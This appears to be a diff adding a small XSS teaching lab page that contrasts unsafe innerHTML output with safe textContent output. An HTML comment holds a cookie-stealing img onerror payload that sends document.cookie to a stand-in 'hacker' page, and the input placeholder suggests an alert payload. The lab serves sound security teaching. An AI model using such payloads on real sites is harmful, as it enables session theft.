@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>XSS Lab</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; }
+        .box { border: 1px solid #ccc; padding: 10px; margin-top: 10px; min-height: 50px; }
+        .danger { background-color: #ffebee; }
+        .safe { background-color: #e8f5e9; }
+    </style>
+</head>
+<body>
+
+    <h2>XSS Prevention Lab</h2>
+    <!-- Try this <img src="x" onerror="document.location='http://127.0.0.1:5500/XSS/hacker.html?' + document.cookie;"> -->
+    <input type="text" id="userInput" placeholder="Type <img src=x onerror=alert(1)>" style="width: 300px;">
+    <button onclick="updatePage()">Display Input</button>
+
+    <h3>Vulnerable (uses .innerHTML):</h3>
+    <div id="vulnerableBox" class="box danger"></div>
+
+    <h3>Secure (uses .textContent):</h3>
+    <div id="safeBox" class="box safe"></div>
+
+    <script>
+        document.cookie = "session_id=SECRET_12345; path=/";
+        function updatePage() {
+            const input = document.getElementById('userInput').value;
+
+            // DANGEROUS: This executes any tags inside the string
+            document.getElementById('vulnerableBox').innerHTML = input;
+
+            // SECURE: This treats everything as plain text
+            document.getElementById('safeBox').textContent = input;
+        }
+    </script>
+
+</body>
+</html>
